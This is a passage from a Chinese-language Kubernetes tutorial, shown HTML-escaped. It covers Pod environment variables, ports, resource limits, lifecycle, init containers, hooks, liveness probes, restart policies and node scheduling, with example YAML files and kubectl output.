/tmp/hello.txt12:55:2712:55:3012:55:3312:55:3612:55:3912:55:42\n\n特别说明：    通过上面发现command已经可以完成启动命令和传递参数的功能,为什么这里还要提供一个args选项,用于传递参数呢?这其实跟docker有点关系，kubernetes中的command、args两项其实是实现覆盖Dockerfile中ENTRYPOINT的功能。 1 如果command和args均没有写,那么用Dockerfile的配置。 2 如果command写了,但args没有写,那么Dockerfile默认的配置会被忽略,执行输入的command 3 如果command没写,但args写了,那么Dockerfile中配置的ENTRYPOINT的命令会被执行,使用当前args的参数 4 如果command和args都写了,那么Dockerfile的配置被忽略,执行command并追加上args参数\n\n\n\n环境变量创建Pod-Env.yaml文件,内容如下:\napiVersion: v1kind: Podmetadata:  name: pod-env  namespace: defaultspec:  containers:  - name: mybusybox    image: docker.io/library/busybox:1.35.0    command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;while true;do /bin/echo $(date +%T);sleep 60; done;&quot;]    env: # 设置环境变量列表    - name: &quot;username&quot;      value: &quot;admin&quot;    - name: &quot;password&quot;      value: &quot;123456&quot;\n\nenv: 环境变量,用于在pod中的容器设置环境变量。\n# 创建pod[root@master yaml]# kubectl create  -f Pod-Env.yamlpod/pod-env created# 进入容器,输出环境变量[root@master yaml]# kubectl exec pod-env -n default -c mybusybox -it /bin/sh/ # echo $usernameadmin/ # echo $password123456\n\n这种方式不是很推荐,推荐将这些配置单独存储在配置文件中,这种方式将在后面介绍。\n端口设置要对容器的端口设置需要对containers的ports选项进行修改,先看一下ports支持的子选项\n[root@master yaml]#  kubectl explain pod.spec.containers.portsKIND:     PodVERSION:  v1RESOURCE: ports &lt;[]Object&gt;DESCRIPTION:     List of ports to expose from the container. Exposing a port here gives the     system additional information about the network connections a container     uses, but is primarily informational. Not specifying a port here DOES NOT     prevent that port from being exposed. Any port which is listening on the     default &quot;0.0.0.0&quot; address inside a container will be accessible from the     network. Cannot be updated.     ContainerPort represents a network port in a single container.FIELDS:   containerPort        &lt;integer&gt; -required- \t# 容器要监听的端口(0&lt;x&lt;65536)     Number of port to expose on the pod&#x27;s IP address. This must be a valid port     number, 0 &lt; x &lt; 65536.   hostIP       &lt;string&gt;\t\t\t# 要将外部端口绑定到的主机IP(一般省略)     What host IP to bind the external port to.   hostPort     &lt;integer&gt;\t\t\t# 容器要在主机上公开的端口,如果设置,主机上只能运行容器的一个副本(一般省略)      Number of port to expose on the host. If specified, this must be a valid     port number, 0 &lt; x &lt; 65536. If HostNetwork is specified, this must match     ContainerPort. Most containers do not need this.   name &lt;string&gt;\t\t\t\t# 端口名称,如果指定,必须保证name在pod中是唯一的\t     If specified, this must be an IANA_SVC_NAME and unique within the pod. Each     named port in a pod must have a unique name. Name for the port that can be     referred to by services.   protocol     &lt;string&gt;\t\t\t# 端口协议。必须是UDP、TCP或SCTP。默认为“TCP”。     Protocol for port. Must be UDP, TCP, or SCTP. Defaults to &quot;TCP&quot;.     Possible enum values:     - `&quot;SCTP&quot;` is the SCTP protocol.     - `&quot;TCP&quot;` is the TCP protocol.     - `&quot;UDP&quot;` is the UDP protocol.\n\n创建Pod-Ports.yaml，内容如下\napiVersion: v1kind: Podmetadata:  name: pod-ports  namespace: defaultspec:  containers:  - name: mynginx    image:  docker.io/library/nginx:1.23.1    ports: # 设置容器暴露的端口列表    - name: nginx-port      containerPort: 80      protocol: TCP\n\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Ports.yamlpod/pod-ports created# 查看pod# 在下面可以明显看到配置信息[root@master ~]# [root@master yaml]# kubectl get pod pod-ports -n default -o yaml......spec:  containers:  - image: docker.io/library/nginx:1.23.1    imagePullPolicy: IfNotPresent    name: mynginx    ports:    - containerPort: 80      name: nginx-port      protocol: TCP......  podIP: 10.244.52.207......# 访问服务# 访问容器中的程序需要使用的是`podIp:containerPort`[root@master yaml]# curl http://10.244.52.207:80&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;/title&gt;&lt;style&gt;html &#123; color-scheme: light dark; &#125;body &#123; width: 35em; margin: 0 auto;font-family: Tahoma, Verdana, Arial, sans-serif; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;&lt;p&gt;If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.&lt;/p&gt;&lt;p&gt;For online documentation and support please refer to&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;Commercial support is available at&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\n\n资源配额  容器中的程序要运行,肯定是要占用一定资源的,比如cpu和内存等,如果不对某个容器的资源做限制,那么它就可能吃掉大量资源,导致其它容器无法运行。针对这种情况，kubernetes提供了对内存和cpu的资源进行配额的机制,这种机制主要通过resources选项实现,他有两个子选项：\n\nlimits：用于限制运行时容器的最大占用资源,当容器占用资源超过limits时会被终止,并进行重启\n\nrequests ：用于设置容器需要的最小资源,如果环境资源不够,容器将无法启动\n\n\n可以通过上面两个选项设置资源的上下限。\n创建Pod-Resources.yaml，内容如下\napiVersion: v1kind: Podmetadata:  name: pod-resources  namespace: defaultspec:  containers:  - name: mynginx    image: docker.io/library/nginx:1.23.1    resources: # 资源配额      limits:  # 限制资源（上限）        cpu: &quot;2&quot; # CPU限制,单位是core数        memory: &quot;10Gi&quot; # 内存限制      requests: # 请求资源（下限）        cpu: &quot;1&quot;  # CPU限制,单位是core数        memory: &quot;10Mi&quot;  # 内存限制\n\nCPU和Memory的单位说明：\n\nCPU: core数,可以为整数或小数\n\nMemory: 内存大小,可以使用Gi、Mi、G、M等形式\n\n\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Resources.yamlpod/pod-resources created# 查看发现pod运行状态[root@master yaml]# kubectl get pod pod-resources -n defaultNAME            READY   STATUS    RESTARTS   AGEpod-resources   1/1     Running   0          88s# 删除Pod[root@master yaml]# kubectl delete -f Pod-Resources.yamlpod &quot;pod-resources&quot; deleted# 编辑Pod-Resources.yaml,修改requests的限制......requests:   cpu: &quot;1&quot;  memory: &quot;10Gi&quot;......# 创建Pod[root@master yaml]# kubectl create -f Pod-Resources.yamlpod/pod-resources created# 查看Pod状态,Pod启动失败[root@master yaml]# kubectl get pod pod-resources -n defaultNAME            READY   STATUS             RESTARTS         AGEpod-resources   0/1     Pending            0                29s# 查看Pod详细信息会看到报错[root@master yaml]# kubectl describe pod pod-resources -n default......Events:  Type     Reason            Age   From               Message  ----     ------            ----  ----               -------  Warning  FailedScheduling  97s   default-scheduler  0/3 nodes are available: 1 node(s) had untolerated taint &#123;node-role.kubernetes.io/master: &#125;, 3 Insufficient memory. preemption: 0/3 nodes are available: 1 Preemption is not helpful for scheduling, 2 No preemption victims found for incoming pod.# 上面的报错指三个节点内存不足\n\nPod生命周期生命周期过程Pod生命周期一般是Pod对象从创建至终的这段时间范围称为pod的生命周期,它主要包含下面的过程：\n\npod创建过程\n\n运行初始化容器（init container）过程\n\n运行主容器（main container）\n\n容器启动后钩子（post start）、容器终止前钩子（pre stop）\n\n容器的存活性探测（liveness probe）、就绪性探测（readiness probe）\n\n\n\npod终止过程\n\n\n\n在整个生命周期中，Pod会出现5种状态（相位）,分别如下：\n\n挂起（Pending）：apiserver已经创建了pod资源对象,但它尚未被调度完成或者仍处于下载镜像的过程中\n运行中（Running）：pod已经被调度至某节点,并且所有容器都已经被kubelet创建完成\n成功（Succeeded）：pod中的所有容器都已经成功终止并且不会被重启\n失败（Failed）：所有容器都已经终止,但至少有一个容器终止失败,即容器返回了非0值的退出状态\n未知（Unknown）：apiserver无法正常获取到pod对象的状态信息,通常由网络通信失败所导致\n\n创建和终止pod的创建过程\n\n用户通过kubectl或其他api客户端提交需要创建的pod信息给apiServer\napiServer开始生成pod对象的信息,并将信息存入etcd，然后返回确认信息至客户端\napiServer开始反映etcd中的pod对象的变化,其它组件使用watch机制来跟踪检查apiServer上的变动\nscheduler发现有新的pod对象要创建,开始为Pod分配主机并将结果信息更新至apiServer\nnode节点上的kubelet发现有pod调度过来,尝试调用启动容器,并将结果回送至apiServer\napiServer将接收到的pod状态信息存入etcd中\n\n\npod的终止过程\n\n用户向apiServer发送删除pod对象的命令\napiServcer中的pod对象信息会随着时间的推移而更新,在宽限期内（默认30s），pod被视为dead\n将pod标记为terminating状态\nkubelet在监控到pod对象转为terminating状态的同时启动pod关闭过程\n端点控制器监控到pod对象的关闭行为时将其从所有匹配到此端点的service资源的端点列表中移除\n如果当前pod对象定义了preStop钩子处理器,则在其标记为terminating后即会以同步的方式启动执行\npod对象中的容器进程收到停止信号\n宽限期结束后,若pod中还存在仍在运行的进程,那么pod对象会收到立即终止的信号\nkubelet请求apiServer将此pod资源的宽限期设置为0从而完成删除操作,此时pod对于用户已不可见\n\n初始化容器初始化容器是在pod的主容器启动之前要运行的容器,主要是做一些主容器的前置工作,它具有两大特征：\n\n初始化容器必须运行完成直至结束,若某初始化容器运行失败,那么kubernetes需要重启它直到成功完成\n初始化容器必须按照定义的顺序执行,当且仅当前一个成功之后,后面的一个才能运行\n\n初始化容器有很多的应用场景,下面列出的是最常见的几个：\n\n提供主容器镜像中不具备的工具程序或自定义代码\n初始化容器要先于应用容器串行启动并运行完成,因此可用于延后应用容器的启动直至其依赖的条件得到满足\n\n假设要以主容器运行一个web程序,但是要求在运行之前需要能够连接上mysql和redis所在的服务器,为了方便测试,事先规划好数据库服务器地址。创建文件Pod-InitContainer.yaml，内容如下\napiVersion: v1kind: Podmetadata:  name: pod-initcontainer  namespace: defaultspec:  containers:  - name: main-container    image: docker.io/library/nginx:1.23.1    ports:     - name: nginx-port      containerPort: 80  initContainers:  - name: test-mysql    image: docker.io/library/busybox:1.35.0    command: [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;until ping 192.16.1.100 -c 1 ; do echo waiting for mysql...; sleep 2; done;&#x27;]  - name: test-redis    image: docker.io/library/busybox:1.35.0    command: [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;until ping 192.16.1.200 -c 1 ; do echo waiting for reids...; sleep 2; done;&#x27;]\n\n# 创建Pod[root@master yaml]# kubectl create -f Pod-InitContainer.yamlpod/pod-initcontainer created# 查看状态# 发现pod一直卡在第一个初始化容器过程中,后面的容器不会运行[root@master yaml]# kubectl describe pod  pod-initcontainer -n default......Events:  Type    Reason     Age   From               Message  ----    ------     ----  ----               -------  Normal  Scheduled  66s   default-scheduler  Successfully assigned default/pod-initcontainer to work1.host.com  Normal  Pulled     66s   kubelet            Container image &quot;docker.io/library/busybox:1.35.0&quot; already present on machine  Normal  Created    66s   kubelet            Created container test-mysql  Normal  Started    66s   kubelet            Started container test-mysql# 动态查看pod状态[root@master yaml]# kubectl get pods pod-initcontainer -n default -wNAME                READY   STATUS     RESTARTS   AGEpod-initcontainer   0/1     Init:0/2   0          5m1spod-initcontainer   0/1     Init:1/2   0          5m4spod-initcontainer   0/1     Init:1/2   0          5m5spod-initcontainer   0/1     PodInitializing   0          5m17spod-initcontainer   1/1     Running           0          5m18s# 开一个新的终端链接并执行以下命令查看pod状态[root@master ~]# ifconfig ens33:1 192.16.1.100 netmask 255.255.255.0 up[root@master ~]# ifconfig ens33:1 192.16.1.200 netmask 255.255.255.0 up\n\n钩子函数钩子函数能够感知自身生命周期中的事件,并在相应的时刻到来时运行用户指定的程序代码。\nkubernetes在主容器的启动之后和停止之前提供了两个钩子函数：\n\npost start：容器创建之后执行,如果失败了会重启容器\npre stop  ：容器终止之前执行,执行完成之后容器将成功终止,在其完成之前会阻塞删除容器的操作\n\n钩子处理器支持使用下面三种方式定义动作：\n\nExec命令：在容器内执行一次命令\n……  lifecycle:    postStart:       exec:        command:        - cat        - /tmp/healthy……\n\nTCPSocket：在当前容器尝试访问指定的socket\n……        lifecycle:    postStart:      tcpSocket:        port: 8080……\n\nHTTPGet：在当前容器中向某url发起http请求\n……  lifecycle:    postStart:      httpGet:        path: / #URI地址        port: 80 #端口号        host: 192.168.109.100 #主机地址        scheme: HTTP #支持的协议，http或者https……\n\n以exec方式为例,创建Pod-Hook-Exec.yaml文件,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-hook-exec  namespace: defaultspec:  containers:  - name: main-container    image: docker.io/library/nginx:1.23.1    ports:    - name: nginx-port      containerPort: 80    lifecycle:      postStart:        exec: # 在容器启动的时候执行一个命令,修改掉nginx的默认首页内容          command: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo postStart... &gt; /usr/share/nginx/html/index.html&quot;]      preStop:        exec: # 在容器停止之前停止nginx服务          command: [&quot;/usr/sbin/nginx&quot;,&quot;-s&quot;,&quot;quit&quot;]\n\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Hook-Exec.yamlpod/pod-hook-exec created# 查看Pod[root@master yaml]# kubectl get pods  pod-hook-exec -n default -o wideNAME            READY   STATUS    RESTARTS   AGE   IP              NODE             NOMINATED NODE   READINESS GATESpod-hook-exec   1/1     Running   0          52s   10.244.52.213   work2.host.com   &lt;none&gt;           &lt;none&gt;# 访问Pod[root@master yaml]# curl 10.244.52.213postStart...\n\n容器探测容器探测用于检测容器中的应用实例是否正常工作,是保障业务可用性的一种传统机制。如果经过探测,实例的状态不符合预期,那么kubernetes就会把该问题实例” 摘除 “,不承担业务流量。kubernetes提供了两种探针来实现容器探测,分别是：\n\nliveness probes：存活性探针,用于检测应用实例当前是否处于正常运行状态,如果不是，k8s会重启容器\n\nreadiness probes：就绪性探针,用于检测应用实例当前是否可以接收请求,如果不能，k8s不会转发流量\n\n\n\nlivenessProbe 决定是否重启容器，readinessProbe 决定是否将请求转发给容器。\n\n上面两种探针目前均支持三种探测方式：\n\nExec命令：在容器内执行一次命令,如果命令执行的退出码为0，则认为程序正常,否则不正常\n……  livenessProbe:    exec:      command:      - cat      - /tmp/healthy……\n\nTCPSocket：将会尝试访问一个用户容器的端口,如果能够建立这条连接,则认为程序正常,否则不正常\n……        livenessProbe:    tcpSocket:      port: 8080……\n\nHTTPGet：调用容器内Web应用的URL，如果返回的状态码在200和399之间,则认为程序正常,否则不正常\n……  livenessProbe:    httpGet:      path: / #URI地址      port: 80 #端口号      host: 127.0.0.1 #主机地址      scheme: HTTP #支持的协议，http或者https……\n\n以liveness probes为例,做几个演示:\n方式一：Exec\n创建Pod-Liveness-Exec.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-liveness-exec  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1    ports:     - name: nginx-port      containerPort: 80    livenessProbe:      exec:        command: [&quot;/bin/cat&quot;,&quot;/tmp/hello.txt&quot;] # 执行一个查看文件的命令\n\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Liveness-Exec.yamlpod/pod-liveness-exec created# 查看Pod详情# 发现nginx容器启动之后就进行了健康检查# 检查失败之后容器就呗kill掉了,之后容器[root@master yaml]# kubectl describe pods pod-liveness-exec -n default......Events:  Type     Reason     Age               From               Message  ----     ------     ----              ----               -------  Normal   Scheduled  25s               default-scheduler  Successfully assigned default/pod-liveness-exec to work1.host.com  Normal   Pulled     24s               kubelet            Container image &quot;docker.io/library/nginx:1.23.1&quot; already present on machine  Normal   Created    24s               kubelet            Created container nginx  Normal   Started    24s               kubelet            Started container nginx  Warning  Unhealthy  5s (x2 over 15s)  kubelet            Liveness probe failed: /bin/cat: /tmp/hello.txt: No such file or directory# 查看Pod状态# 发现RESTARTS一直在增长[root@master yaml]# kubectl get pods pod-liveness-exec -n defaultNAME                READY   STATUS             RESTARTS      AGEpod-liveness-exec   0/1     CrashLoopBackOff   4 (12s ago)   2m43s\n\n方式二：TCPSocket\n创建Pod-Liveness-Tcpsocket.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-liveness-tcpsocket  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1    ports:    - name: nginx-port      containerPort: 80    livenessProbe:      tcpSocket:        port: 8080 # 尝试访问8080端口\n\n# 创建Pod[root@master yaml]# kubectl create -f  Pod-Liveness-Tcpsocket.yamlpod/pod-liveness-tcpsocket created# 查看Pod详情# 发现容器尝试访问8080端口,但是失败了[root@master yaml]# kubectl describe pods pod-liveness-tcpsocket -n default......Events:  Type     Reason     Age               From               Message  ----     ------     ----              ----               -------  Normal   Scheduled  31s               default-scheduler  Successfully assigned default/pod-liveness-tcpsocket to work1.host.com  Normal   Pulled     1s (x2 over 30s)  kubelet            Container image &quot;docker.io/library/nginx:1.23.1&quot; already present on machine  Normal   Created    1s (x2 over 30s)  kubelet            Created container nginx  Normal   Started    1s (x2 over 30s)  kubelet            Started container nginx  Warning  Unhealthy  1s (x3 over 21s)  kubelet            Liveness probe failed: dial tcp 10.244.67.89:8080: connect: connection refused  Normal   Killing    1s                kubelet            Container nginx failed liveness probe, will be restarted# 查看Pod状态# 发现RESTARTS一直在增长[root@master yaml]# kubectl get pods pod-liveness-tcpsocket -n defaultNAME                     READY   STATUS    RESTARTS     AGEpod-liveness-tcpsocket   1/1     Running   4 (7s ago)   2m7s\n\n方式三：HTTPGet\n创建Pod-Liveness-Httpget.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-liveness-httpget  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1    ports:    - name: nginx-port      containerPort: 80    livenessProbe:      httpGet:          # 其实就是访问http://127.0.0.1:80/hello        scheme: HTTP    #支持的协议，http或者https        port: 80        #端口号        path: /hello    #URI地址\n\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Liveness-Httpget.yamlpod/pod-liveness-httpget created# 查看Pod详情[root@master yaml]# kubectl describe pod pod-liveness-httpget -n default......Events:  Type     Reason     Age               From               Message  ----     ------     ----              ----               -------  Normal   Scheduled  22s               default-scheduler  Successfully assigned default/pod-liveness-httpget to work2.host.com  Normal   Pulled     22s               kubelet            Container image &quot;docker.io/library/nginx:1.23.1&quot; already present on machine  Normal   Created    21s               kubelet            Created container nginx  Normal   Started    21s               kubelet            Started container nginx  Warning  Unhealthy  2s (x2 over 12s)  kubelet            Liveness probe failed: HTTP probe failed with statuscode: 404# 查看Pod状态# 发现RESTARTS一直在增长[root@master yaml]# kubectl get pod pod-liveness-httpget -n defaultNAME                   READY   STATUS    RESTARTS      AGEpod-liveness-httpget   1/1     Running   2 (26s ago)   86s\n\n在LivenessProbe的子属性下还会发现一些其他的配置,这里简单解释一下含义：\n[root@master yaml]# kubectl explain pod.spec.containers.livenessProbeKIND:     PodVERSION:  v1RESOURCE: livenessProbe &lt;Object&gt;DESCRIPTION:     Periodic probe of container liveness. Container will be restarted if the     probe fails. Cannot be updated. More info:     https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle#container-probes     Probe describes a health check to be performed against a container to     determine whether it is alive or ready to receive traffic.FIELDS:   exec &lt;Object&gt;     Exec specifies the action to take.   failureThreshold     &lt;integer&gt;\t\t# 连续探测失败多少次才被认定为失败。默认是3。最小值是1     Minimum consecutive failures for the probe to be considered failed after     having succeeded. Defaults to 3. Minimum value is 1.   grpc &lt;Object&gt;     GRPC specifies an action involving a GRPC port. This is a beta field and     requires enabling GRPCContainerProbe feature gate.   httpGet      &lt;Object&gt;     HTTPGet specifies the http request to perform.   initialDelaySeconds  &lt;integer&gt;\t\t# 容器启动后等待多少秒执行第一次探测      Number of seconds after the container has started before liveness probes     are initiated. More info:     https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle#container-probes   periodSeconds        &lt;integer&gt;\t\t# 执行探测的频率。默认是10秒,最小1秒     How often (in seconds) to perform the probe. Default to 10 seconds. Minimum     value is 1.   successThreshold     &lt;integer&gt;\t\t# 连续探测成功多少次才被认定为成功。默认是1     Minimum consecutive successes for the probe to be considered successful     after having failed. Defaults to 1. Must be 1 for liveness and startup.     Minimum value is 1.   tcpSocket    &lt;Object&gt;     TCPSocket specifies an action involving a TCP port.   terminationGracePeriodSeconds        &lt;integer&gt;     Optional duration in seconds the pod needs to terminate gracefully upon     probe failure. The grace period is the duration in seconds after the     processes running in the pod are sent a termination signal and the time     when the processes are forcibly halted with a kill signal. Set this value     longer than the expected cleanup time for your process. If this value is     nil, the pod&#x27;s terminationGracePeriodSeconds will be used. Otherwise, this     value overrides the value provided by the pod spec. Value must be     non-negative integer. The value zero indicates stop immediately via the     kill signal (no opportunity to shut down). This is a beta field and     requires enabling ProbeTerminationGracePeriod feature gate. Minimum value     is 1. spec.terminationGracePeriodSeconds is used if unset.   timeoutSeconds       &lt;integer&gt;\t\t# 探测超时时间。默认1秒,最小1秒     Number of seconds after which the probe times out. Defaults to 1 second.     Minimum value is 1. More info:     https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle#container-probes\n\n设置探测详细时间参照下面配置\napiVersion: v1kind: Podmetadata:  name: pod-liveness-httpget  namespace: devspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1    ports:    - name: nginx-port      containerPort: 80    livenessProbe:      httpGet:        scheme: HTTP        port: 80         path: /      initialDelaySeconds: 30 # 容器启动后30s开始探测      timeoutSeconds: 5 # 探测超时时间为5s\n\n\n\n重启策略在容器探测livenessProbe中一旦探测出现了问题,Kubernetes就会对容器所在的Pod进行重启,重启的方式是由pod的重启策略决定的，Pod的重启策略有三种,分别如下:\n\nAlways ：容器失效时,自动重启该容器,这也是默认值。\nOnFailure ： 容器终止运行且退出码不为0时重启\nNever ： 不论状态为何,都不重启该容器\n\n重启策略适用于pod对象中的所有容器,首次需要重启的容器,将在其需要时立即进行重启,随后再次需要重启的操作将由kubelet延迟一段时间后进行,且反复的重启操作的延迟时长以此为10s、20s、40s、80s、160s和300s，300s是最大延迟时长。\n创建Pod-Restartpolicy.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-restartpolicy  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1    ports:    - name: nginx-port      containerPort: 80    livenessProbe:      httpGet:        scheme: HTTP        port: 80        path: /hello  restartPolicy: Never # 设置重启策略为Never\n\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Restartpolicy.yamlpod/pod-restartpolicy created# 查看Pod详情,发现nginx容器的健康检查失败[root@master yaml]# kubectl  describe pods pod-restartpolicy  -n default......Events:  Type     Reason     Age                From               Message  ----     ------     ----               ----               -------  Normal   Scheduled  49s                default-scheduler  Successfully assigned default/pod-restartpolicy to work1.host.com  Normal   Pulled     48s                kubelet            Container image &quot;docker.io/library/nginx:1.23.1&quot; already present on machine  Normal   Created    48s                kubelet            Created container nginx  Normal   Started    48s                kubelet            Started container nginx  Warning  Unhealthy  19s (x3 over 39s)  kubelet            Liveness probe failed: HTTP probe failed with statuscode: 404  Normal   Killing    19s                kubelet            Stopping container nginx# 过一会之后,查看pod的状态,发现重启次数一直是0[root@master yaml]# kubectl  get pods pod-restartpolicy -n defaultNAME                READY   STATUS      RESTARTS   AGEpod-restartpolicy   0/1     Completed   0          2m7s\n\n\n\nPod调度调度方式在默认情况下，一个Pod在哪个Node节点上运行，是由Scheduler组件采用相应的算法计算出来的，这个过程是不受人工控制的。但是在实际使用中，这并不满足的需求，因为很多情况下，控制某些Pod到达某些节点上，这就需要了解kubernetes对Pod的调度规则，kubernetes提供了四大类调度方式：\n\n自动调度：运行在哪个节点上完全由Scheduler经过一系列的算法计算得出\n定向调度：NodeName、NodeSelector\n亲和性调度：NodeAffinity、PodAffinity、PodAntiAffinity\n污点（容忍）调度：Taints、Toleration\n\n定向调度定向调度，指的是利用在pod上声明nodeName或者nodeSelector，以此将Pod调度到期望的node节点上。注意，这里的调度是强制的，这就意味着即使要调度的目标Node不存在，也会向上面进行调度，只不过pod运行失败而已\nNodeNameNodeName用于强制约束将Pod调度到指定的Name的Node节点上。这种方式，其实是直接跳过Scheduler的调度逻辑，直接将Pod调度到指定名称的节点。\n创建一个Pod-Nodename.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-nodename  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1  nodeName: node1  # 指定调度到node1节点上\n\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Nodename.yamlpod/pod-nodename created# 查看Pod具体状态和调度节点# 发现Pod调度到了node1节点上，但是实则我的集群是没有这个节点的所以导致一直无法正常运行[root@master yaml]# kubectl get pods pod-nodename -n default -o wideNAME           READY   STATUS    RESTARTS   AGE   IP       NODE    NOMINATED NODE   READINESS GATESpod-nodename   0/1     Pending   0          10s   &lt;none&gt;   node1   &lt;none&gt;           &lt;none&gt;# 修改文件的nodeName为&quot;work1.host.com&quot;并更新配置[root@master yaml]# vim Pod-Nodename.yaml[root@master yaml]# kubectl apply -f Pod-Nodename.yamlpod/pod-nodename created# 再次查看Pod的具体状态和调度节点# 发现已经成功调度到其他节点并运行成功[root@master yaml]# kubectl get pods pod-nodename -n default -o wideNAME           READY   STATUS    RESTARTS   AGE   IP             NODE             NOMINATED NODE   READINESS GATESpod-nodename   1/1     Running   0          34s   10.244.67.91   work1.host.com   &lt;none&gt;           &lt;none&gt;\n\nNodeSelectorNodeSelector用于将pod调度到添加了指定标签的node节点上。它是通过kubernetes的label-selector机制实现的，也就是说，在pod创建之前，会由scheduler使用MatchNodeSelector调度策略进行label匹配，找出目标node，然后将pod调度到目标节点，该匹配规则是强制约束。\n# 给节点创建标签# 给work1.host.com节点创建了一个nodeenv=pro标签# 给work2.host.com节点创建了一个nodeenv=test标签[root@master yaml]# kubectl label nodes work1.host.com nodeenv=pronode/work1.host.com labeled[root@master yaml]# kubectl label nodes work2.host.com nodeenv=testnode/work2.host.com labeled\n\n创建Pod-Nodeselector.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-nodeselector  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1  nodeSelector:     nodeenv: pro # 指定调度到具有nodeenv=pro标签的节点上\n\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Nodeselector.yamlpod/pod-nodeselector created# 查看Pod的具体状态和调度节点[root@master yaml]# kubectl get pods pod-nodeselector -n default -o wideNAME               READY   STATUS    RESTARTS   AGE   IP             NODE             NOMINATED NODE   READINESS GATESpod-nodeselector   1/1     Running   0          51s   10.244.67.92   work1.host.com   &lt;none&gt;           &lt;none&gt;# 之后删除pod，修改nodeSelector的值为nodeenv: pro2 (不存在打有此标签的节点)[root@master yaml]# kubectl delete -f Pod-Nodeselector.yamlpod &quot;pod-nodeselector&quot; deleted[root@master yaml]# vim Pod-Nodeselector.yaml[root@master yaml]# kubectl create -f Pod-Nodeselector.yamlpod/pod-nodeselector created# 再次查看Pod的具体状态和调度节点# 发现调度节的值为&lt;none&gt;[root@master yaml]# kubectl get pods pod-nodeselector -n default -o wideNAME               READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED NODE   READINESS GATESpod-nodeselector   0/1     Pending   0          43s   &lt;none&gt;   &lt;none&gt;   &lt;none&gt;           &lt;none&gt;# 通过查看Pod详情，发现node selector匹配失败的提示[root@master yaml]# kubectl describe pods pod-nodeselector -n default......Events:  Type     Reason            Age   From               Message  ----     ------            ----  ----               -------  Warning  FailedScheduling  118s  default-scheduler  0/3 nodes are available: 1 node(s) had untolerated taint &#123;node-role.kubernetes.io/master: &#125;, 3 node(s) didn&#x27;t match Pod&#x27;s node affinity/selector. preemption: 0/3 nodes are available: 3 Preemption is not helpful for scheduling.\n\n\n\n亲和性调度使用定向调度进行调度时，如果出现没有满足条件的Node那么Pod就会不被运行,为了解决这个问题,Kubernetes在NodeSelector的基础之上的进行了扩展，通过配置的形式实现优先选择满足条件的Node进行调度，如果没有也可以调度到不满足条件的节点上，使其更加灵活。Affinity主要分为三类：\n\nnodeAffinity(node亲和性）: 以node为目标，解决pod可以调度到哪些node的问题\n\npodAffinity(pod亲和性) :  以pod为目标，解决pod可以和哪些已存在的pod部署在同一个拓扑域中的问题\n\npodAntiAffinity(pod反亲和性) :  以pod为目标，解决pod不能和哪些已存在pod部署在同一个拓扑域中的问题\n\n\n\n关于亲和性(反亲和性)使用场景的说明：\n亲和性：如果两个应用频繁交互，那就有必要利用亲和性让两个应用的尽可能的靠近，这样可以减少因网络通信而带来的性能损耗。\n反亲和性：当应用的采用多副本部署时，有必要采用反亲和性让各个应用实例打散分布在各个node上，这样可以提高服务的高可用性。\n\nNodeAffinityNodeAffinity的可配置项如下：\npod.spec.affinity.nodeAffinity  requiredDuringSchedulingIgnoredDuringExecution  Node节点必须满足指定的所有规则才可以，相当于硬限制    nodeSelectorTerms  节点选择列表      matchFields   按节点字段列出的节点选择器要求列表      matchExpressions   按节点标签列出的节点选择器要求列表(推荐)        key    键        values 值        operator 关系符 支持Exists, DoesNotExist, In, NotIn, Gt, Lt  preferredDuringSchedulingIgnoredDuringExecution 优先调度到满足指定的规则的Node，相当于软限制 (倾向)    preference   一个节点选择器项，与相应的权重相关联      matchFields   按节点字段列出的节点选择器要求列表      matchExpressions   按节点标签列出的节点选择器要求列表(推荐)        key    键        values 值        operator 关系符 支持In, NotIn, Exists, DoesNotExist, Gt, Lt\tweight 倾向权重，在范围1-100。\n\n关系符的使用说明:- matchExpressions:  - key: nodeenv              # 匹配存在标签的key为nodeenv的节点    operator: Exists  - key: nodeenv              # 匹配标签的key为nodeenv,且value是&quot;xxx&quot;或&quot;yyy&quot;的节点    operator: In    values: [&quot;xxx&quot;,&quot;yyy&quot;]  - key: nodeenv              # 匹配标签的key为nodeenv,且value大于&quot;xxx&quot;的节点    operator: Gt    values: 